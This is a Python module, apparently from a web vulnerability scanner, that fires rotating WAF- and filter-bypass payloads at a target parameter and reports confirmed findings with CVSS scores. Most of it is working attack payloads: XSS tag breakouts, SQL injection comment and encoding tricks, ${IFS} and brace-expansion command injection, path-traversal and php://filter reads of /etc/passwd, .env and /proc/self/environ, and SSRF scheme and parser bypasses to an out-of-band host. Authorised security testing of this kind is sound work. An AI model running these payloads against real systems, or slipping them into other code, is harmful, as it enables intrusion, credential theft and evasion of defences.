"""Control-bypass / payload-variation engine.

For each vulnerability class, rotate a matrix of payload VARIATIONS — filter
bypasses, encodings, context breakouts, alternate engines/schemes/separators —
and confirm a hit ONLY via a deterministic signal. So where a single baseline
payload is sanitised/encoded/WAF-blocked, the engine keeps trying variants and,
if one gets through, *proves* it (never guesses). One confirmed variant is enough.

Same contract as verifiers: a finding is emitted only on proof, and it records
WHICH variation defeated the control (valuable in the report). Classes covered:
SQLi (error), XSS (context breakouts), OS command injection (timing + output),
SSTI (multi-engine), LFI / path traversal (traversal + wrappers + encodings),
SSRF (scheme / parser bypass, OOB-confirmed).
"""
import re
import time
from urllib.parse import urlencode

from .verifiers import _set_param, SQL_ERRORS

_FORM_HDR = "Content-Type: application/x-www-form-urlencoded"
_PASSWD_RE = re.compile(r"root:.*:0:0:", re.M)
_ID_RE = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+\(")


# ------------------------------------------------------------------ injection
def _injector(send, method, url, inputs, param):
    """Return inject(payload) -> response dict, GET via query / POST via body."""
    if method == "POST":
        def inject(payload):
            body = urlencode({**(inputs or {}), param: payload})
            return send("POST", url, headers=_FORM_HDR, body=body)
    else:
        def inject(payload):
            return send("GET", _set_param(url, param, payload))
    return inject


def _reqline(method, url, inputs, param, payload):
    if method == "POST":
        return f"POST {url}\n{_FORM_HDR}\n\n{urlencode({**(inputs or {}), param: payload})}"
    return f"GET {_set_param(url, param, payload)}"


def _base_token(inputs, param):
    raw = (inputs.get(param) if inputs else "") or "1"
    m = re.match(r"[A-Za-z0-9_.@-]+", raw.strip())
    return m.group(0) if m else "1"


# ------------------------------------------------------------------ XSS
def _xss_variations(mark):
    """(label, payload, signature-that-must-survive-unencoded).

    Only *self-contained element injections* — a tag whose handler executes
    wherever the reflection lands (text OR attribute context). We deliberately
    avoid bare in-attribute / JS-string-context payloads: those confirm on raw
    reflection even where they would NOT execute, which would be a false positive.
    """
    m = mark
    return [
        ("double-quote attribute breakout → <svg>", f'{m}"><svg/onload=alert({m})>', f'<svg/onload=alert({m})>'),
        ("single-quote attribute breakout → <svg>", f"{m}'><svg/onload=alert({m})>", f'<svg/onload=alert({m})>'),
        ("<img onerror>", f'{m}"><img src=x onerror=alert({m})>', f'<img src=x onerror=alert({m})>'),
        ("<body onload>", f'{m}"><body onload=alert({m})>', f'<body onload=alert({m})>'),
        ("<details ontoggle>", f'{m}"><details open ontoggle=alert({m})>', f'<details open ontoggle=alert({m})>'),
        ("mixed-case tag (filter bypass)", f'{m}"><SvG oNLoAd=alert({m})>', f'<SvG oNLoAd=alert({m})>'),
        ("<svg> no slash", f'{m}"><svg onload=alert({m})>', f'<svg onload=alert({m})>'),
        ("<iframe onload>", f'{m}"><iframe onload=alert({m})>', f'<iframe onload=alert({m})>'),
        ("<marquee onstart>", f'{m}"><marquee onstart=alert({m})>', f'<marquee onstart=alert({m})>'),
        ("<video><source onerror>", f'{m}"><video><source onerror=alert({m})>', f'<source onerror=alert({m})>'),
    ]


def check_xss(inject, mark):
    for label, payload, sig in _xss_variations(mark):
        r = inject(payload)
        if r.get("ok") and sig in (r.get("text") or ""):
            return label, payload, (r.get("text") or "")[:800]
    return None


# ------------------------------------------------------------------ SQLi (error)
_SQLI_VARIATIONS = [
    ("single quote", "{v}'"),
    ("double quote", '{v}"'),
    ("backtick", "{v}`"),
    ("quote + paren", "{v}')"),
    ("quote + double paren", "{v}'))"),
    ("quote + comment", "{v}'-- -"),
    ("quote + hash comment", "{v}'%23"),
    ("inline-comment WAF bypass", "{v}'/**/OR/**/'1'='1"),
    ("newline WAF bypass", "{v}'%0aOR%0a'1'='1"),
    ("double-URL-encoded quote", "{v}%2527"),
    ("unicode-ish quote", "{v}’"),
]


def check_sqli(inject, base_val, baseline_body):
    bl = (baseline_body or "").lower()
    base_err = next((s for s in SQL_ERRORS if s in bl), None)
    for label, tmpl in _SQLI_VARIATIONS:
        r = inject(tmpl.format(v=base_val))
        if not r.get("ok"):
            continue
        low = (r.get("text") or "").lower()
        hit = next((s for s in SQL_ERRORS if s in low), None)
        if hit and hit != base_err:       # a NEW SQL error this payload provoked
            return label, tmpl.format(v=base_val), (r.get("text") or "")[:800]
    return None


# ------------------------------------------------------------------ OS command injection
# Output-signature separators (fast). The baseline sweep already covers standard
# timing separators, so here we add the *bypass-style* ones (IFS / brace / quoted).
_CMD_OUT = [("semicolon id", "{v};id"), ("pipe id", "{v}|id"),
            ("$(id) substitution", "{v}$(id)"), ("backtick id", "{v}`id`"),
            ("${IFS} bypass id", "{v};${{IFS}}id"), ("newline id", "{v}%0aid")]
_CMD_TIMING = [
    ("${IFS} space bypass", "{v};sleep${{IFS}}{n}"),
    ("brace expansion", "{v};{{sleep,{n}}}"),
    ("quoted break-out", "{v}';sleep {n};'"),
    ("newline separator", "{v}%0asleep {n}"),
]


def _elapsed(inject, payload):
    t = time.time()
    r = inject(payload)
    return time.time() - t, r


def check_cmd(inject, base_val, delay=4, timing=True):
    # 1) output signature (fast): `id` output reflected unambiguously
    for label, tmpl in _CMD_OUT:
        r = inject(tmpl.format(v=base_val))
        if r.get("ok") and _ID_RE.search(r.get("text") or ""):
            hit = _ID_RE.search(r.get("text") or "").group(0)
            return label + " (output)", tmpl.format(v=base_val), hit
    # 2) bypass-style timing fallback (reproducible delay; double-checked)
    if not timing:
        return None
    base_e, _ = _elapsed(inject, base_val)
    for label, tmpl in _CMD_TIMING:
        long_e, r = _elapsed(inject, tmpl.format(v=base_val, n=delay))
        if r.get("ok") and long_e - base_e >= delay * 0.6 and long_e >= delay * 0.7:
            re_e, _ = _elapsed(inject, tmpl.format(v=base_val, n=delay))
            if re_e - base_e >= delay * 0.6:
                return (label + " (timing)", tmpl.format(v=base_val, n=delay),
                        f"baseline={base_e:.1f}s, sleep({delay})={long_e:.1f}s/{re_e:.1f}s")
    return None


# ------------------------------------------------------------------ SSTI (multi-engine)
_A, _B = 911, 877
_PROD = str(_A * _B)                          # 798947


def _ssti_variations(mark):
    a, b = _A, _B
    return [
        ("Jinja2/Twig {{ }}", f"{mark}{{{{{a}*{b}}}}}"),
        ("ERB <%= %>", f"{mark}<%= {a}*{b} %>"),
        ("Freemarker/Mako ${{ }}", f"{mark}${{{a}*{b}}}"),
        ("Smarty { }", f"{mark}{{{a}*{b}}}"),
        ("Velocity #set", f"{mark}#set($x={a}*{b})$x"),
        ("Razor @( )", f"{mark}@({a}*{b})"),
        ("Thymeleaf [[ ]]", f"{mark}[[${{{a}*{b}}}]]"),
        ("Jinja2 #{ }", f"{mark}#{{{a}*{b}}}"),
    ]


def check_ssti(inject, mark):
    want = mark + _PROD
    expr_literal = f"{_A}*{_B}"
    for label, payload in _ssti_variations(mark):
        r = inject(payload)
        body = r.get("text") or ""
        # computed product must appear next to our mark, and NOT the literal expr
        if r.get("ok") and want in body and (mark + expr_literal) not in body:
            return label, payload, body[body.find(want) - 20: body.find(want) + 40]
    return None


# ------------------------------------------------------------------ LFI / traversal
_LFI_SIGS = [
    (_PASSWD_RE.search, "/etc/passwd (root:...:0:0)"),
    (lambda b: "[extensions]" in b.lower(), "Windows win.ini"),
    (lambda b: "cm9vdDp" in b, "base64(/etc/passwd) via php://filter"),
    (lambda b: "DB_PASSWORD" in b or "APP_KEY=" in b, "application .env"),
]
_LFI_VARIATIONS = [
    ("plain traversal", "../../../../../../../../etc/passwd"),
    ("deep traversal", "../" * 12 + "etc/passwd"),
    ("nested ....// bypass", "....//....//....//....//....//....//etc/passwd"),
    ("URL-encoded slash", "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"),
    ("URL-encoded dot+slash", "%2e%2e%2f" * 8 + "etc%2fpasswd"),
    ("double URL-encoded", "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"),
    ("absolute path", "/etc/passwd"),
    ("null-byte truncation", "../../../../../../etc/passwd%00"),
    ("php filter wrapper (base64)", "php://filter/convert.base64-encode/resource=/etc/passwd"),
    ("proc self environ", "/proc/self/environ"),
    ("file:// scheme", "file:///etc/passwd"),
    ("Windows traversal", "..\\..\\..\\..\\..\\..\\windows\\win.ini"),
    ("app .env", "../" * 10 + ".env"),
]


def check_lfi(inject):
    for label, payload in _LFI_VARIATIONS:
        r = inject(payload)
        if not r.get("ok"):
            continue
        body = r.get("text") or ""
        for test, sig in _LFI_SIGS:
            try:
                if test(body):
                    return f"{label} → {sig}", payload, "\n".join(body.splitlines()[:30])[:900]
            except Exception:
                continue
    return None


# ------------------------------------------------------------------ SSRF (OOB-confirmed)
def _ssrf_variations(oob_host, token):
    h = oob_host
    return [
        ("direct http", f"http://{h}/{token}"),
        ("https", f"https://{h}/{token}"),
        ("scheme-relative //", f"//{h}/{token}"),
        ("credential @-trick", f"http://expected.example.com@{h}/{token}"),
        ("gopher wrapper", f"gopher://{h}:80/_{token}"),
        ("dict wrapper", f"dict://{h}:80/{token}"),
        ("uppercase scheme", f"HTTP://{h}/{token}"),
        ("trailing-dot host", f"http://{h}./{token}"),
        ("embedded fragment", f"http://{h}/{token}#@expected.example.com"),
    ]


def check_ssrf(inject, oob_host, token, oob_check):
    """oob_check(token) -> bool: did the collaborator receive a callback?"""
    if not (oob_host and token and oob_check):
        return None
    for label, payload in _ssrf_variations(oob_host, token):
        inject(payload)
        time.sleep(0.4)
        if oob_check(token):
            return label, payload, f"OOB callback received for token {token} via {label}"
    return None


# ------------------------------------------------------------------ driver
_META = {
    "hunt-xss":  ("Reflected XSS confirmed by filter-bypass variation", "high",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
    "hunt-sqli": ("SQL injection confirmed by payload variation", "critical",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "hunt-cmd":  ("OS command injection confirmed by separator variation", "critical",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "hunt-ssti": ("Server-side template injection confirmed by engine variation", "high",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"),
    "hunt-lfi":  ("Local file inclusion confirmed by traversal/wrapper variation", "high",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "hunt-ssrf": ("SSRF confirmed by scheme/parser bypass variation", "high",
                  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"),
}


def run_variations(send, method, url, param, inputs, classes, ctx):
    """Try bypass variations for each requested class on one parameter.
    `ctx` dict: mark (unique token), oob_host, oob_token, oob_check (callable).
    Returns a list of finding dicts (one per class that a variation confirmed)."""
    inject = _injector(send, method, url, inputs, param)
    base_val = _base_token(inputs, param)
    mark = ctx.get("mark", "bqx7731")
    findings = []

    def emit(vclass, label, payload, evidence):
        title, sev, cvss = _META[vclass]
        findings.append(dict(
            title=f"{title} via '{param}'",
            vuln_class=vclass, severity=sev, cvss=cvss, confidence="confirmed",
            description=f"Parameter '{param}' is exploitable for {vclass.replace('hunt-','').upper()}. "
                        f"A baseline payload may be filtered, but the variation **{label}** defeated the "
                        f"control and tripped a deterministic signal — proving the sanitisation/WAF is "
                        f"bypassable, not just that input is reflected.",
            steps=f"Bypass variation '{label}': {payload}",
            poc_request=_reqline(method, url, inputs, param, payload),
            poc_response=evidence))

    try:
        if "hunt-sqli" in classes:
            bl = inject(base_val)
            res = check_sqli(inject, base_val, bl.get("text") or "")
            if res:
                emit("hunt-sqli", *res)
        if "hunt-xss" in classes:
            res = check_xss(inject, mark)
            if res:
                emit("hunt-xss", *res)
        if "hunt-ssti" in classes:
            res = check_ssti(inject, mark)
            if res:
                emit("hunt-ssti", *res)
        if "hunt-lfi" in classes:
            res = check_lfi(inject)
            if res:
                emit("hunt-lfi", *res)
        if "hunt-cmd" in classes:
            res = check_cmd(inject, base_val)
            if res:
                emit("hunt-cmd", *res)
        if "hunt-ssrf" in classes:
            res = check_ssrf(inject, ctx.get("oob_host"), ctx.get("oob_token"),
                             ctx.get("oob_check"))
            if res:
                emit("hunt-ssrf", *res)
    except Exception:
        pass
    return findings
